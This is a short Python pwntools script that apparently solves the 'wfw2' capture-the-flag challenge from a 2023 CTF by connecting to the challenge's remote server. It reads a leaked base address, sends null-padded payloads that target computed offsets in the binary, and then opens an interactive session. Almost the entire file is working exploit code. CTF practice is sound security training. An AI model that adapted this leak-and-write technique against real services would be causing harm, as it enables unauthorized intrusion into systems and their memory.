from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./chal')
p = remote("wfw2.2023.ctfcompetition.com",1337)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)
ru(b"fluff\n")
base = int(p.readuntil("-")[:-1],0x10)
print(hex(base))
ru(b"\n\n")

target = base+0x20D5
pay = hex(target).encode()+b" 120"
p.send(pay.ljust(0x40,b'\0'))
target = base+0x1440
pay = hex(target).encode()+b" 2"
p.send(pay.ljust(0x40,b'\0'))
target = base+0x1442
pay = hex(target).encode()+b" 1"
p.send(pay.ljust(0x40,b'\0'))
target = base+0x1443
pay = hex(target).encode()+b" 2"
p.send(pay.ljust(0x40,b'\0'))

p.send(b"".ljust(0x40,b'\0'))
p.read()
p.interactive()